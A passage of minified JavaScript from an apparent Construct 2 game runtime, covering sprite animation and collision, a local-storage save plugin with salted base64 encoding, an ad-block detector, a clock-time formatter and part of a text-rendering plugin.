cr.KahanAdder,this.frameStart=this.getNowTime(),this.animPlaying=!0,this.animRepeats=0,this.animForwards=!0,this.animTriggerName="",this.changeAnimName="",this.changeAnimFrom=0,this.changeAnimFrame=-1,this.type.loadTextures(),t=0,e=this.type.animations.length;t<e;t++)for(i=0,s=(n=this.type.animations[t]).frames.length;i<s;i++)0===(r=n.frames[i]).width&&(r.width=r.texture_img.width,r.height=r.texture_img.height),r.spritesheeted&&(a=r.texture_img,(o=r.sheetTex).left=r.offx/a.width,o.top=r.offy/a.height,o.right=(r.offx+r.width)/a.width,o.bottom=(r.offy+r.height)/a.height,0===r.offx&&0===r.offy&&r.width===a.width&&r.height===a.height&&(r.spritesheeted=!1));this.curFrame=this.cur_animation.frames[this.cur_frame],this.curWebGLTexture=this.curFrame.webGL_texture},i.saveToJSON=function(){var t={a:this.cur_animation.sid,f:this.cur_frame,cas:this.cur_anim_speed,fs:this.frameStart,ar:this.animRepeats,at:this.animTimer.sum,rt:this.cur_anim_repeatto};return this.animPlaying||(t.ap=this.animPlaying),this.animForwards||(t.af=this.animForwards),t},i.loadFromJSON=function(t){var e=this.getAnimationBySid(t.a);e&&(this.cur_animation=e),this.cur_frame=t.f,this.cur_frame<0&&(this.cur_frame=0),this.cur_frame>=this.cur_animation.frames.length&&(this.cur_frame=this.cur_animation.frames.length-1),this.cur_anim_speed=t.cas,this.frameStart=t.fs,this.animRepeats=t.ar,this.animTimer.reset(),this.animTimer.sum=t.at,this.animPlaying=!t.hasOwnProperty("ap")||t.ap,this.animForwards=!t.hasOwnProperty("af")||t.af,t.hasOwnProperty("rt")?this.cur_anim_repeatto=t.rt:this.cur_anim_repeatto=this.cur_animation.repeatto,this.curFrame=this.cur_animation.frames[this.cur_frame],this.curWebGLTexture=this.curFrame.webGL_texture,this.collision_poly.set_pts(this.curFrame.poly_pts),this.hotspotX=this.curFrame.hotspotX,this.hotspotY=this.curFrame.hotspotY},i.animationFinish=function(t){this.cur_frame=t?0:this.cur_animation.frames.length-1,this.animPlaying=!1,this.animTriggerName=this.cur_animation.name,this.inAnimTrigger=!0,this.runtime.trigger(cr.plugins_.Sprite.prototype.cnds.OnAnyAnimFinished,this),this.runtime.trigger(cr.plugins_.Sprite.prototype.cnds.OnAnimFinished,this),this.inAnimTrigger=!1,this.animRepeats=0},i.getNowTime=function(){return this.animTimer.sum},i.tick=function(){this.animTimer.add(this.runtime.getDt(this)),this.changeAnimName.length&&this.doChangeAnim(),0<=this.changeAnimFrame&&this.doChangeAnimFrame();var t=this.getNowTime(),e=this.cur_animation,i=e.frames[this.cur_frame],s=i.duration/this.cur_anim_speed;this.animPlaying&&t>=this.frameStart+s&&(this.animForwards?this.cur_frame++:this.cur_frame--,this.frameStart+=s,this.cur_frame>=e.frames.length&&(e.pingpong?(this.animForwards=!1,this.cur_frame=e.frames.length-2):e.loop?this.cur_frame=this.cur_anim_repeatto:(this.animRepeats++,this.animRepeats>=e.repeatcount?this.animationFinish(!1):this.cur_frame=this.cur_anim_repeatto)),this.cur_frame<0&&(e.pingpong?(this.cur_frame=1,this.animForwards=!0,e.loop||(this.animRepeats++,this.animRepeats>=e.repeatcount&&this.animationFinish(!0))):e.loop?this.cur_frame=this.cur_anim_repeatto:(this.animRepeats++,this.animRepeats>=e.repeatcount?this.animationFinish(!0):this.cur_frame=this.cur_anim_repeatto)),this.cur_frame<0?this.cur_frame=0:this.cur_frame>=e.frames.length&&(this.cur_frame=e.frames.length-1),t>this.frameStart+e.frames[this.cur_frame].duration/this.cur_anim_speed&&(this.frameStart=t),e=e.frames[this.cur_frame],this.OnFrameChanged(i,e),this.runtime.redraw=!0)},i.getAnimationByName=function(t){for(var e,i=0,s=this.type.animations.length;i<s;i++)if(e=this.type.animations[i],cr.equals_nocase(e.name,t))return e;return null},i.getAnimationBySid=function(t){for(var e,i=0,s=this.type.animations.length;i<s;i++)if((e=this.type.animations[i]).sid===t)return e;return null},i.doChangeAnim=function(){var t=this.cur_animation.frames[this.cur_frame],e=this.getAnimationByName(this.changeAnimName);this.changeAnimName="",e&&(cr.equals_nocase(e.name,this.cur_animation.name)&&this.animPlaying||(this.cur_animation=e,this.cur_anim_speed=e.speed,this.cur_anim_repeatto=e.repeatto,this.cur_frame<0&&(this.cur_frame=0),this.cur_frame>=this.cur_animation.frames.length&&(this.cur_frame=this.cur_animation.frames.length-1),1===this.changeAnimFrom&&(this.cur_frame=0),this.animPlaying=!0,this.frameStart=this.getNowTime(),this.animForwards=!0,this.OnFrameChanged(t,this.cur_animation.frames[this.cur_frame]),this.runtime.redraw=!0))},i.doChangeAnimFrame=function(){var t=this.cur_animation.frames[this.cur_frame],e=this.cur_frame;this.cur_frame=cr.floor(this.changeAnimFrame),this.cur_frame<0&&(this.cur_frame=0),this.cur_frame>=this.cur_animation.frames.length&&(this.cur_frame=this.cur_animation.frames.length-1),e!==this.cur_frame&&(this.OnFrameChanged(t,this.cur_animation.frames[this.cur_frame]),this.frameStart=this.getNowTime(),this.runtime.redraw=!0),this.changeAnimFrame=-1},i.OnFrameChanged=function(t,e){var i,s,n,r=t.width,o=t.height,a=e.width,h=e.height;for(r!=a&&(this.width*=a/r),o!=h&&(this.height*=h/o),this.hotspotX=e.hotspotX,this.hotspotY=e.hotspotY,this.collision_poly.set_pts(e.poly_pts),this.set_bbox_changed(),this.curFrame=e,this.curWebGLTexture=e.webGL_texture,i=0,s=this.behavior_insts.length;i<s;i++)(n=this.behavior_insts[i]).onSpriteFrameChanged&&n.onSpriteFrameChanged(t,e);this.runtime.trigger(cr.plugins_.Sprite.prototype.cnds.OnFrameChanged,this)},i.draw=function(t){t.globalAlpha=this.opacity;var e,i,s=this.curFrame,n=s.spritesheeted,r=s.texture_img,o=this.x,a=this.y,h=this.width,c=this.height;0===this.angle&&0<=h&&0<=c?(o-=this.hotspotX*h,a-=this.hotspotY*c,this.runtime.pixel_rounding&&(o=Math.round(o),a=Math.round(a)),n?t.drawImage(r,s.offx,s.offy,s.width,s.height,o,a,h,c):t.drawImage(r,o,a,h,c)):(this.runtime.pixel_rounding&&(o=Math.round(o),a=Math.round(a)),t.save(),e=0<h?1:-1,i=0<c?1:-1,t.translate(o,a),1==e&&1==i||t.scale(e,i),t.rotate(this.angle*e*i),e=0-this.hotspotX*cr.abs(h),i=0-this.hotspotY*cr.abs(c),n?t.drawImage(r,s.offx,s.offy,s.width,s.height,e,i,cr.abs(h),cr.abs(c)):t.drawImage(r,e,i,cr.abs(h),cr.abs(c)),t.restore())},i.drawGL_earlyZPass=function(t){this.drawGL(t)},i.drawGL=function(t){t.setTexture(this.curWebGLTexture),t.setOpacity(this.opacity);var e,i,s=this.curFrame,n=this.bquad;this.runtime.pixel_rounding?(e=Math.round(this.x)-this.x,i=Math.round(this.y)-this.y,s.spritesheeted?t.quadTex(n.tlx+e,n.tly+i,n.trx+e,n.try_+i,n.brx+e,n.bry+i,n.blx+e,n.bly+i,s.sheetTex):t.quad(n.tlx+e,n.tly+i,n.trx+e,n.try_+i,n.brx+e,n.bry+i,n.blx+e,n.bly+i)):s.spritesheeted?t.quadTex(n.tlx,n.tly,n.trx,n.try_,n.brx,n.bry,n.blx,n.bly,s.sheetTex):t.quad(n.tlx,n.tly,n.trx,n.try_,n.brx,n.bry,n.blx,n.bly)},i.getImagePointIndexByName=function(t){for(var e=this.curFrame,i=0,s=e.image_points.length;i<s;i++)if(cr.equals_nocase(t,e.image_points[i][0]))return i;return-1},i.getImagePoint=function(t,e){var i=this.curFrame,s=i.image_points,n=cr.is_string(t)?this.getImagePointIndexByName(t):t-1;if((n=cr.floor(n))<0||n>=s.length)return e?this.x:this.y;var r=(s[n][1]-i.hotspotX)*this.width,t=((t=s[n][2])-i.hotspotY)*this.height,s=Math.cos(this.angle),n=Math.sin(this.angle),i=r*s-t*n;return t=t*s+r*n,r=i,r+=this.x,t+=this.y,e?r:t};var o=[];function v(t){t[0]=0,t[1]=0,t[2]=0,o.push(t)}function b(t,e){return t<e?t+","+e:e+","+t}function w(t,e,i,s){var n=e.uid,r=i.uid,e=b(n,r);t.hasOwnProperty(e)?t[e][2]=s:((i=o.length?o.pop():[0,0,0])[0]=n,i[1]=r,i[2]=s,t[e]=i)}var x=-2,S=[];s.prototype.OnCollision=function(t){if(!t)return!1;var e=this.runtime,i=e.getCurrentCondition(),s=i.type,n=null;i.extra.collmemory?n=i.extra.collmemory:(n={},i.extra.collmemory=n),i.extra.spriteCreatedDestroyCallback||(i.extra.spriteCreatedDestroyCallback=!0,e.addDestroyCallback(function(n){!function(t){var e,i,s=n.uid;for(e in t)t.hasOwnProperty(e)&&((i=t[e])[0]!==s&&i[1]!==s||(v(t[e]),delete t[e]))}(i.extra.collmemory)}));for(var r,o,a,h,c,l,u,p=s.getCurrentSol(),d=t.getCurrentSol(),g=p.getObjects(),f=this.runtime.tickcount,m=f-1,y=e.getCurrentEventStack().current_event,_=(y.orblock,0);_<g.length;_++){for(o=g[_],d.select_all?(o.update_bbox(),this.runtime.getCollisionCandidates(o.layer,t,o.bbox,S),r=S,this.runtime.addRegisteredCollisionCandidates(o,t,r)):r=d.getObjects(),a=0;a<r.length;a++)c=r[a],e.testOverlap(o,c)||e.checkRegisteredCollision(o,c)?(l=n,u=c,u=b(o.uid,u.uid),u=!(l.hasOwnProperty(u)?(x=l[u][2],!0):!(x=-2))||x<m,w(n,o,c,f),u&&(e.pushCopySol(y.solModifiers),u=s.getCurrentSol(),h=t.getCurrentSol(),u.select_all=!1,h.select_all=!1,s===t?(u.instances.length=2,u.instances[0]=o,u.instances[1]=c,s.applySolToContainer()):(u.instances.length=1,h.instances.length=1,u.instances[0]=o,h.instances[0]=c,s.applySolToContainer(),t.applySolToContainer()),y.retrigger(),e.popSol(y.solModifiers))):(h=n,c=c,c=b(o.uid,c.uid),h.hasOwnProperty(c)&&(v(h[c]),delete h[c]));cr.clearArray(S)}return!1};var f=null,m=new cr.ObjectSet,y=!1,_=[],T=new cr.rect(0,0,0,0);function r(t,e,i){if(!t)return!1;var s,n,r,o,a,h=0!==e||0!==i,c=!1,l=this.runtime.getCurrentCondition(),u=l.type,p=l.inverted,d=t.getCurrentSol(),l=this.runtime.getCurrentEventStack().current_event.orblock,g=d.select_all?(this.update_bbox(),T.copy(this.bbox),T.offset(e,i),this.runtime.getCollisionCandidates(this.layer,t,T,_),_):!l||this.runtime.isCurrentConditionFirst()&&!d.else_instances.length&&d.instances.length?d.instances:d.else_instances;for(y=u!==(f=t)&&!p,h&&(s=this.x,n=this.y,this.x+=e,this.y+=i,this.set_bbox_changed()),r=0,o=g.length;r<o;r++)if(a=g[r],this.runtime.testOverlap(this,a)){if(c=!0,p)break;u!==t&&m.add(a)}return h&&(this.x=s,this.y=n,this.set_bbox_changed()),cr.clearArray(_),c}function a(){}function h(){}e.finish=function(t){if(y){if(t){var e,t=this.runtime.getCurrentEventStack().current_event.orblock,i=f.getCurrentSol(),s=m.valuesRef();if(i.select_all){for(i.select_all=!1,cr.clearArray(i.instances),r=0,o=s.length;r<o;++r)i.instances[r]=s[r];if(t)for(cr.clearArray(i.else_instances),r=0,o=f.instances.length;r<o;++r)e=f.instances[r],m.contains(e)||i.else_instances.push(e)}else if(t)for(var n=i.instances.length,r=0,o=s.length;r<o;++r)i.instances[n+r]=s[r],cr.arrayFindRemove(i.else_instances,s[r]);else cr.shallowAssignArray(i.instances,s);f.applySolToContainer()}m.clear(),y=!1}},s.prototype.IsOverlapping=function(t){return r.call(this,t,0,0)},s.prototype.IsOverlappingOffset=function(t,e,i){return r.call(this,t,e,i)},s.prototype.IsAnimPlaying=function(t){return this.changeAnimName.length?cr.equals_nocase(this.changeAnimName,t):cr.equals_nocase(this.cur_animation.name,t)},s.prototype.CompareFrame=function(t,e){return cr.do_cmp(this.cur_frame,t,e)},s.prototype.CompareAnimSpeed=function(t,e){var i=this.animForwards?this.cur_anim_speed:-this.cur_anim_speed;return cr.do_cmp(i,t,e)},s.prototype.OnAnimFinished=function(t){return cr.equals_nocase(this.animTriggerName,t)},s.prototype.OnAnyAnimFinished=function(){return!0},s.prototype.OnFrameChanged=function(){return!0},s.prototype.IsMirrored=function(){return this.width<0},s.prototype.IsFlipped=function(){return this.height<0},s.prototype.OnURLLoaded=function(){return!0},s.prototype.IsCollisionEnabled=function(){return this.collisionsEnabled},t.cnds=new s,a.prototype.Spawn=function(t,e,i){if(t&&e){var s,n,r,o=this.runtime.createInstance(t,e,this.getImagePoint(i,!0),this.getImagePoint(i,!1));if(o){if(void 0!==o.angle&&(o.angle=this.angle,o.set_bbox_changed()),this.runtime.isInOnDestroy++,this.runtime.trigger(Object.getPrototypeOf(t.plugin).cnds.OnCreated,o),o.is_contained)for(s=0,n=o.siblings.length;s<n;s++)r=o.siblings[s],this.runtime.trigger(Object.getPrototypeOf(r.type.plugin).cnds.OnCreated,r);this.runtime.isInOnDestroy--;var a,i=this.runtime.getCurrentAction(),h=!1;if((cr.is_undefined(i.extra.Spawn_LastExec)||i.extra.Spawn_LastExec<this.runtime.execcount)&&(h=!0,i.extra.Spawn_LastExec=this.runtime.execcount),t!=this.type&&((a=t.getCurrentSol()).select_all=!1,h?(cr.clearArray(a.instances),a.instances[0]=o):a.instances.push(o),o.is_contained))for(s=0,n=o.siblings.length;s<n;s++)(a=(r=o.siblings[s]).type.getCurrentSol()).select_all=!1,h?(cr.clearArray(a.instances),a.instances[0]=r):a.instances.push(r)}}},a.prototype.SetEffect=function(t){this.blend_mode=t,this.compositeOp=cr.effectToCompositeOp(t),cr.setGLBlend(this,t,this.runtime.gl),this.runtime.redraw=!0},a.prototype.StopAnim=function(){this.animPlaying=!1},a.prototype.StartAnim=function(t){this.animPlaying=!0,this.frameStart=this.getNowTime(),1===t&&0!==this.cur_frame&&(this.changeAnimFrame=0,this.inAnimTrigger||this.doChangeAnimFrame()),this.isTicking||(this.runtime.tickMe(this),this.isTicking=!0)},a.prototype.SetAnim=function(t,e){this.changeAnimName=t,this.changeAnimFrom=e,this.isTicking||(this.runtime.tickMe(this),this.isTicking=!0),this.inAnimTrigger||this.doChangeAnim()},a.prototype.SetAnimFrame=function(t){this.changeAnimFrame=t,this.isTicking||(this.runtime.tickMe(this),this.isTicking=!0),this.inAnimTrigger||this.doChangeAnimFrame()},a.prototype.SetAnimSpeed=function(t){this.cur_anim_speed=cr.abs(t),this.animForwards=0<=t,this.isTicking||(this.runtime.tickMe(this),this.isTicking=!0)},a.prototype.SetAnimRepeatToFrame=function(t){(t=Math.floor(t))<0&&(t=0),t>=this.cur_animation.frames.length&&(t=this.cur_animation.frames.length-1),this.cur_anim_repeatto=t},a.prototype.SetMirrored=function(t){t=cr.abs(this.width)*(0===t?-1:1);this.width!==t&&(this.width=t,this.set_bbox_changed())},a.prototype.SetFlipped=function(t){t=cr.abs(this.height)*(0===t?-1:1);this.height!==t&&(this.height=t,this.set_bbox_changed())},a.prototype.SetScale=function(t){var e=this.curFrame,i=this.width<0?-1:1,s=this.height<0?-1:1,i=e.width*t*i,s=e.height*t*s;this.width===i&&this.height===s||(this.width=i,this.height=s,this.set_bbox_changed())},a.prototype.LoadURL=function(t,e,i){var s=new Image,n=this,r=this.curFrame;s.onload=function(){if(r.texture_img.src===s.src)return n.runtime.glwrap&&n.curFrame===r&&(n.curWebGLTexture=r.webGL_texture),0===e&&(n.width=s.width,n.height=s.height,n.set_bbox_changed()),n.runtime.redraw=!0,void n.runtime.trigger(cr.plugins_.Sprite.prototype.cnds.OnURLLoaded,n);r.texture_img=s,r.offx=0,r.offy=0,r.width=s.width,r.height=s.height,r.spritesheeted=!1,r.datauri="",r.pixelformat=0,n.runtime.glwrap&&(r.webGL_texture&&n.runtime.glwrap.deleteTexture(r.webGL_texture),r.webGL_texture=n.runtime.glwrap.loadTexture(s,!1,n.runtime.linearSampling),n.curFrame===r&&(n.curWebGLTexture=r.webGL_texture),n.type.updateAllCurrentTexture()),0===e&&(n.width=s.width,n.height=s.height,n.set_bbox_changed()),n.runtime.redraw=!0,n.runtime.trigger(cr.plugins_.Sprite.prototype.cnds.OnURLLoaded,n)},"data:"!==t.substr(0,5)&&0===i&&(s.crossOrigin="anonymous"),this.runtime.setImageSrc(s,t)},a.prototype.SetCollisions=function(t){this.collisionsEnabled!==(0!==t)&&(this.collisionsEnabled=0!==t,this.collisionsEnabled?this.set_bbox_changed():(this.collcells.right>=this.collcells.left&&this.type.collision_grid.update(this,this.collcells,null),this.collcells.set(0,0,-1,-1)))},t.acts=new a,h.prototype.AnimationFrame=function(t){t.set_int(this.cur_frame)},h.prototype.AnimationFrameCount=function(t){t.set_int(this.cur_animation.frames.length)},h.prototype.AnimationName=function(t){t.set_string(this.cur_animation.name)},h.prototype.AnimationSpeed=function(t){t.set_float(this.animForwards?this.cur_anim_speed:-this.cur_anim_speed)},h.prototype.ImagePointX=function(t,e){t.set_float(this.getImagePoint(e,!0))},h.prototype.ImagePointY=function(t,e){t.set_float(this.getImagePoint(e,!1))},h.prototype.ImagePointCount=function(t){t.set_int(this.curFrame.image_points.length)},h.prototype.ImageWidth=function(t){t.set_float(this.curFrame.width)},h.prototype.ImageHeight=function(t){t.set_float(this.curFrame.height)},t.exps=new h}(),cr.plugins_.SyncStorage=function(t){this.runtime=t},function(){var t=cr.plugins_.SyncStorage.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.data={},this.isStorageLoaded=!1,this.storageIndex=this.properties[1],this.isEncodingEnabled=!this.properties[3],this.headSalt=this.properties[4],this.tailSalt=this.properties[5],this.isLocalStorageLoaded=null,this.LS_Instance=null,this.LS_ProtoActions=null,this.lastErrorMsg=null},e.onDestroy=function(){},e.isLocalStorageReady=function(){if(this.isLocalStorageLoaded)return!0;if(!this.storageIndex)return!1;if(cr.plugins_.LocalStorage){var t,e;for(t in this.runtime.types)this.runtime.types.hasOwnProperty(t)&&this.runtime.types[t].plugin instanceof cr.plugins_.LocalStorage&&(e=this.runtime.types[t]);if(e)return this.LS_Instance=e.instances[0],this.LS_ProtoActions=cr.plugins_.LocalStorage.prototype.acts,this.isLocalStorageLoaded=!0}return console.log("\n*\n*\n*\nERROR: LocalStorage plugin not found. You must add LocalStorage plugin to the project. It's a JS library for SyncStorage plugin.\n*\n*\n*\n"),!1},i.prototype.OnLoaded=function(){return!0},i.prototype.OnLoadError=function(){return!0},i.prototype.IsLoaded=function(){return this.isStorageLoaded},i.prototype.HasData=function(t){return this.hasData(t)},i.prototype.CompareData=function(t,e,i){return cr.do_cmp(this.data[t],e,i)},i.prototype.OnSave=function(){return!0},i.prototype.OnDataMissing=function(){return!0},t.cnds=new i,s.prototype.SetData=function(t,e){this.data[t]=e},s.prototype.SaveData=function(){this.isLocalStorageReady()&&this.LS_ProtoActions.SetItem.call(this.LS_Instance,this.storageIndex,this.isEncodingEnabled?this.encode(JSON.stringify(this.data)):JSON.stringify(this.data)),this.runtime.trigger(cr.plugins_.SyncStorage.prototype.cnds.OnSave,this)},s.prototype.LoadData=function(){if(!this.isLocalStorageReady())return this.lastErrorMsg='Could not load data from LocalStorage. Possible reasons: "LocalStorage IDX" property not set or LocalStorage plugin is not added to the project.',this.runtime.trigger(cr.plugins_.SyncStorage.prototype.cnds.OnLoadError,this),void(this.lastErrorMsg="");var i=this;localforage.getItem(this.storageIndex,function(t,e){t?(t?"string"==typeof t.message?t=t.message:"string"==typeof t.name?t=t.name:"string"==typeof t.data?t=t.data:"string"!=typeof t&&(t="unknown error"):t="unknown error",i.isStorageLoaded=!1,i.lastErrorMsg=t,i.runtime.trigger(cr.plugins_.SyncStorage.prototype.cnds.OnLoadError,i),i.lastErrorMsg=null):(null==e||""===e?(i.data={},i.runtime.trigger(cr.plugins_.SyncStorage.prototype.cnds.OnDataMissing,i)):i.data=i.isEncodingEnabled?JSON.parse(i.decode(e)):JSON.parse(e),i.isStorageLoaded=!0,i.runtime.trigger(cr.plugins_.SyncStorage.prototype.cnds.OnLoaded,i))})},s.prototype.ClearData=function(){this.data={}},s.prototype.RemoveData=function(t){void 0!==this.data[t]&&delete this.data[t]},s.prototype.LoadString=function(t){try{""==t?(this.data={},this.runtime.trigger(cr.plugins_.SyncStorage.prototype.cnds.OnDataMissing,this)):"{"===t.charAt(0)?this.data=JSON.parse(t):this.data=JSON.parse(this.decode(t)),this.runtime.trigger(cr.plugins_.SyncStorage.prototype.cnds.OnLoaded,this)}catch(t){this.lastErrorMsg=t.message,this.runtime.trigger(cr.plugins_.SyncStorage.prototype.cnds.OnLoadError,this),this.lastErrorMsg=""}},s.prototype.AddValue=function(t,e){this.hasData(t)||(this.data[t]=0),!isNaN(parseFloat(e))&&isFinite(e)&&(this.data[t]+=e)},s.prototype.SubtractValue=function(t,e){this.hasData(t)||(this.data[t]=0),!isNaN(parseFloat(e))&&isFinite(e)&&(this.data[t]-=e)},s.prototype.AppendValue=function(t,e){this.hasData(t)||(this.data[t]=""),"string"==typeof e&&(this.data[t]+=e)},s.prototype.PrependValue=function(t,e){this.hasData(t)||(this.data[t]=""),"string"==typeof e&&(this.data[t]=e+this.data[t])},t.acts=new s,n.prototype.GetData=function(t,e){t.set_any(this.data[e])},n.prototype.StorageIndex=function(t){t.set_string(this.storageIndex)},n.prototype.HasData=function(t,e){t.set_int(+this.hasData(e))},n.prototype.AsJSON=function(t){t.set_string(JSON.stringify(this.data))},n.prototype.AsString=function(t){t.set_string(this.isEncodingEnabled?this.encode(JSON.stringify(this.data)):JSON.stringify(this.data))},n.prototype.ErrorMsg=function(t){t.set_string(this.lastErrorMsg)},n.prototype.Get=function(t,e){t.set_any(this.data[e])},n.prototype.Has=function(t,e){t.set_int(+this.hasData(e))},e.encode=function(t){for(var e=c.encode(t),i=0;i<this.headSalt;i++)e=e.charAt(Math.floor(Math.random()*(e.length-1)))+e;for(i=0;i<this.tailSalt;i++)e+=e.charAt(Math.floor(Math.random()*(e.length-1)));return e},e.decode=function(t){t=(t=t.substring(this.headSalt)).substring(0,t.length-this.tailSalt);return t=c.decode(t)},e.hasData=function(t){return!!this.data[t]},t.exps=new n;var c={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(t){var e,i,s,n,r,o,a="",h=0;for(t=c._utf8_encode(t);h<t.length;)s=(o=t.charCodeAt(h++))>>2,n=(3&o)<<4|(e=t.charCodeAt(h++))>>4,r=(15&e)<<2|(i=t.charCodeAt(h++))>>6,o=63&i,isNaN(e)?r=o=64:isNaN(i)&&(o=64),a=a+this._keyStr.charAt(s)+this._keyStr.charAt(n)+this._keyStr.charAt(r)+this._keyStr.charAt(o);return a},decode:function(t){var e,i,s,n,r,o="",a=0;for(t=t.replace(/[^A-Za-z0-9\+\/\=]/g,"");a<t.length;)e=this._keyStr.indexOf(t.charAt(a++))<<2|(s=this._keyStr.indexOf(t.charAt(a++)))>>4,i=(15&s)<<4|(n=this._keyStr.indexOf(t.charAt(a++)))>>2,s=(3&n)<<6|(r=this._keyStr.indexOf(t.charAt(a++))),o+=String.fromCharCode(e),64!=n&&(o+=String.fromCharCode(i)),64!=r&&(o+=String.fromCharCode(s));return c._utf8_decode(o)},_utf8_encode:function(t){t=t.replace(/\r\n/g,"\n");for(var e="",i=0;i<t.length;i++){var s=t.charCodeAt(i);s<128?e+=String.fromCharCode(s):(127<s&&s<2048?e+=String.fromCharCode(s>>6|192):(e+=String.fromCharCode(s>>12|224),e+=String.fromCharCode(s>>6&63|128)),e+=String.fromCharCode(63&s|128))}return e},_utf8_decode:function(t){for(var e,i,s="",n=0,r=0;n<t.length;)(e=t.charCodeAt(n))<128?(s+=String.fromCharCode(e),n++):191<e&&e<224?(r=t.charCodeAt(n+1),s+=String.fromCharCode((31&e)<<6|63&r),n+=2):(r=t.charCodeAt(n+1),i=t.charCodeAt(n+2),s+=String.fromCharCode((15&e)<<12|(63&r)<<6|63&i),n+=3);return s}}}(),cr.plugins_.TR_AdBlockDetector=function(t){this.runtime=t},function(){var t=cr.plugins_.TR_AdBlockDetector.prototype;function e(){}function i(){}t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime},t.Instance.prototype.onCreate=function(){this.adblock=!1;var t=this,e=new XMLHttpRequest;e.onreadystatechange=function(){4===this.readyState&&0===this.status&&(t.adblock=!0)},e.open("GET","https://api.adinplay.com/libs/aiptag/assets/adsbygoogle.js",!0),e.send()},e.prototype.IsBlocking=function(){return this.adblock},e.prototype.IsReady=function(){return!0},t.cnds=new e,t.acts=new function(){},i.prototype.IsBlocking=function(t){t.set_int(+this.adblock)},t.exps=new i}(),cr.plugins_.TR_ClockParser=function(t){this.runtime=t},function(){var t=cr.plugins_.TR_ClockParser.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}e.onCreate=function(){},e.onDestroy=function(){},t.cnds=new function(){},t.acts=new function(){},i.prototype.Minimal=function(t,e){e=parseInt(e,10);var i=Math.floor(e/3600),s=Math.floor((e-3600*i)/60),n=e-3600*i-60*s,e="";0<i&&(e+=(i<10?"0"+i:i)+":"),(0<i||0<s)&&(e+=(s<10?"0"+s:s)+":"),e+=n<10?"0"+n:n,t.set_string(e)},i.prototype.MMSS=function(t,e){e=parseInt(e,10);var i=Math.floor(e/60),e=e-60*i;i<10&&(i="0"+i),e<10&&(e="0"+e),t.set_string(i+":"+e)},i.prototype.HHMMSS=function(t,e){e=parseInt(e,10);var i=Math.floor(e/3600),s=Math.floor((e-3600*i)/60),e=e-3600*i-60*s;i<10&&(i="0"+i),s<10&&(s="0"+s),e<10&&(e="0"+e),t.set_string(i+":"+s+":"+e)},t.exps=new i}(),cr.plugins_.Text=function(t){this.runtime=t},function(){var t=cr.plugins_.Text.prototype;t.onCreate=function(){t.acts.SetWidth=function(t){this.width!==t&&(this.width=t,this.text_changed=!0,this.set_bbox_changed())}},t.Type=function(t){this.plugin=t,this.runtime=t.runtime},(e=t.Type.prototype).onCreate=function(){},e.onLostWebGLContext=function(){if(!this.is_family)for(var t,e=0,i=this.instances.length;e<i;e++)(t=this.instances[e]).mycanvas=null,t.myctx=null,t.mytex=null},t.Instance=function(t){this.type=t,this.runtime=t.runtime,this.recycled?cr.clearArray(this.lines):this.lines=[],this.text_changed=!0};var e=t.Instance.prototype,o={};e.onCreate=function(){this.text=this.properties[0],this.visible=0===this.properties[1],this.font=this.properties[2],this.color=this.properties[3],this.halign=this.properties[4],this.valign=this.properties[5],this.wrapbyword=0===this.properties[7],this.lastwidth=this.width,this.lastwrapwidth=this.width,this.lastheight=this.height,this.line_height_offset=this.properties[8],this.facename="",this.fontstyle="",this.ptSize=0,this.textWidth=0,this.textHeight=0,this.parseFont(),this.mycanvas=null,this.myctx=null,this.mytex=null,this.need_text_redraw=!1,this.last_render_tick=this.runtime.tickcount,this.recycled?this.rcTex.set(0,0,1,1):this.rcTex=new cr.rect(0,0,1,1),this.runtime.glwrap&&this.runtime.tickMe(this)},e.parseFont=function(){for(var t=this.font.split(" "),e=0;e<t.length;e++)if("pt"===t[e].substr(t[e].length-2,2)){for(this.ptSize=parseInt(t[e].substr(0,t[e].length-2)),this.pxHeight=Math.ceil(this.ptSize/72*96)+4,0<e&&(this.fontstyle=t[e-1]),this.facename=t[e+1],e+=2;e<t.length;e++)this.facename+=" "+t[e];break}},e.saveToJSON=function(){return{t:this.text,f:this.font,c:this.color,ha:this.halign,va:this.valign,wr:this.wrapbyword,lho:this.line_height_offset,fn:this.facename,fs:this.fontstyle,ps:this.ptSize,pxh:this.pxHeight,tw:this.textWidth,th:this.textHeight,lrt:this.last_render_tick}},e.loadFromJSON=function(t){this.text=t.t,this.font=t.f,this.color=t.c,this.halign=t.ha,this.valign=t.va,this.wrapbyword=t.wr,this.line_height_offset=t.lho,this.facename=t.fn,this.fontstyle=t.fs,this.ptSize=t.ps,this.pxHeight=t.pxh,this.textWidth=t.tw,this.textHeight=t.th,this.last_render_tick=t.lrt,this.text_changed=!0,this.lastwidth=this.width,this.lastwrapwidth=this.width,this.lastheight=this.height},e.tick=function(){var t,e;this.runtime.glwrap&&this.mytex&&300<=this.runtime.tickcount-this.last_render_tick&&(t=this.layer,this.update_bbox(),((e=this.bbox).right<t.viewLeft||e.bottom<t.viewTop||e.left>t.viewRight||e.top>t.viewBottom)&&(this.runtime.glwrap.deleteTexture(this.mytex),this.mytex=null,this.myctx=null,this.mycanvas=null))},e.onDestroy=function(){this.myctx=null,this.mycanvas=null,this.runtime.glwrap&&this.mytex&&this.runtime.glwrap.deleteTexture(this.mytex),this.mytex=null},e.updateFont=function(){this.font=this.fontstyle+" "+this.ptSize.toString()+"pt "+this.facename,this.text_changed=!0,this.runtime.redraw=!0},e.draw=function(t,e){t.font=this.font,t.textBaseline="top",t.fillStyle=this.color,t.globalAlpha=e?1:this.opacity;var i;e&&(i=Math.abs(this.layer.getScale()),t.save(),t.scale(i,i)),!this.text_changed&&this.width===this.lastwrapwidth||(this.type.plugin.WordWrap(this.text,this.lines,t,this.width,this.wrapbyword),this.text_changed=!1,this.lastwrapwidth=this.width),this.update_bbox();var s=e?0:this.bquad.tlx,n=e?0:this.bquad.tly;this.runtime.pixel_rounding&&(s=s+.5|0,n=n+.5|0),0===this.angle||e||(t.save(),t.translate(s,n),t.rotate(this.angle),n=s=0);var 